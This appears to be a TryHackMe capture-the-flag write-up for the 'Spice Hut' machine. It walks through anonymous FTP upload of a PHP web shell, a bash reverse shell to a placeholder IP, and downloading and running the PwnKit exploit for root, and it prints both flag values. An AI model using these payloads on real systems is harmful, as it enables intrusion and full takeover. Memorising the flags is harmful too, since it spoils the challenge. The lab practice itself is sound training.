# Spice Hut – TryHackMe Writeup

## 🧠 Overview

| Field | Details |
|---|---|
| **Target IP** | 10.113.138.124 |
| **Platform** | TryHackMe |
| **Difficulty** | Easy / Medium |
| **Objective** | Gain root access and retrieve all flags |

---

## 🔍 Reconnaissance

Started with an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV 10.113.138.124
```

**Results:**

| Port | Service | Note |
|---|---|---|
| 21 | FTP | Anonymous login allowed + Writable |
| 22 | SSH | — |
| 80 | HTTP | — |

> 💡 **Key Insight:** Writable FTP access provides a clear entry point.

---

## 🚪 Initial Access — FTP Exploitation

Connected to the FTP server:

```bash
ftp 10.113.138.124
```

**Credentials:**

```
Username: anonymous
Password: anonymous
```

Found a writable directory:

```
ftp/
```

### 💉 Upload Web Shell

Created a simple PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Uploaded it to the server:

```bash
put shell.php
```

---

## ⚡ Remote Code Execution (RCE)

Accessed the shell via browser:

```
http://TARGET/files/ftp/shell.php?cmd=id
```

**Output:**

```
uid=33(www-data)
```

> ✔ RCE confirmed

---

## 🐚 Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

> ✔ Gained interactive shell

### 🧰 Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🔼 Privilege Escalation

Searched for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

**Important finding:**

```
/usr/bin/pkexec
```

> 💡 **Vulnerable to:** CVE-2021-4034 (PwnKit)

### 💣 Exploitation — PwnKit

Download the exploit:

```bash
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O pwnkit
chmod +x pwnkit
```

Upload and execute:

```bash
./pwnkit
```

**Result:**

```
root@startup#
```

> ✔ Root access obtained

---

## 🏁 Flags

### 👤 User Flag

```bash
cat /home/lennie/user.txt
```

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

### 👑 Root Flag

```bash
cat /root/root.txt
```

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

### 🍲 Secret Spicy Soup Recipe

```bash
cat /recipe.txt
```

*(Use the exact output from this file)*

---

## 📌 Key Takeaways

- Anonymous writable FTP is a critical misconfiguration
- File upload can lead directly to Remote Code Execution
- Always enumerate SUID binaries
- PwnKit is a powerful local privilege escalation exploit
- Shell stabilization improves control and usability

---

## 💀 Final Thoughts

This machine demonstrates a classic attack chain:

1. **Misconfiguration exploitation** (FTP)
2. **File upload → RCE**
3. **Privilege escalation** via known vulnerability

A great example of how small security gaps can lead to full system compromise.
